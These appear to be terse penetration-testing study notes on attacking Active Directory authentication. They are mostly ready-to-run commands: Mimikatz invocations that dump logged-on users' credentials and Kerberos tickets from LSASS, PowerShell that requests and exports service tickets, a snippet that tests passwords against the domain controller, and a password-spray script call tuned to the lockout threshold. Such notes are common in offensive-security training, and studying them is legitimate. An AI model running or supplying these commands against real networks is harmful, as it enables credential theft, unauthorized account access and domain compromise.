After finding the users, attempt to login as the user


Kerberos, NTLM, (WDigest older versions)

### NTLM

![[efc3ae731d085f29a1673782d583e64d-ad_ntlm.png]]

### Kerberos

![[b5e6b0ecb201daef973f507049049029-ad_kerbauth.png]]

Password hashes are stored in LSASS memory space(system ot admin access required). Data structure are not publicly documented and they are also encrypted with LSASS-stored key.


Not recomended to execute Mimikatz as a stand-alone app. Use Powershell or dump the process memoory and move it to a helper machine.


### Mimikatz

always begin with

```
privilege::debug
```

dump credentials of logged users

```
sekurlsa::logonpasswords
```

dump the tickets

```
sekurlsa::tickets
```

### Request the ticket

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

ticket will be stored in memory

use `klist` command to view the tickets

alternatively with mimikatz

```
kerberos::list /export
```


### Low and slow password guessing

find Lockout threshold - limit of failed passwords

```
net accounts
```


```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
```

If the password for the user account is correct, the object creation will be successful and the result will be shown

If password is invalid - no object will be created

```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.
"
  + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemExce
  + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma
```


For automation use "password spray" script from scripts folder

```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```

